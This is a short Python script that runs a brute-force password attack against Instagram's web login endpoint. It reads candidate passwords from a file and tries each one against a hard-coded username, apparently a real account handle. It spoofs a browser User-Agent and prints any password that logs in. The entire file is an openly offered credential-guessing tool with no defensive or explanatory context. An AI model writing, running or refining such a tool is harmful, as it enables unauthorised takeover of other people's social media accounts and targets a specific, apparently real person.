import requests
import json

# Function to make a login request to Instagram API
def login(username, password):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

# Function to check if the login was successful
def is_login_successful(response):
    if response.get("authenticated"):
        return True
    return False

# Function to perform brute-force attack
def brute_force_attack(username, password_list):
    for password in password_list:
        response = login(username, password)
        if is_login_successful(response):
            print(f"Login successful with password: {password}")
            return
    print("Brute-force attack failed. Password not found.")

# Main program
def main():
    username = "its_tushar_suyal"
    password_list_file = "password_list.txt"
    
    with open(password_list_file, "r") as file:
        password_list = file.read().splitlines()
    
    brute_force_attack(username, password_list)

if __name__ == "__main__":
    main()
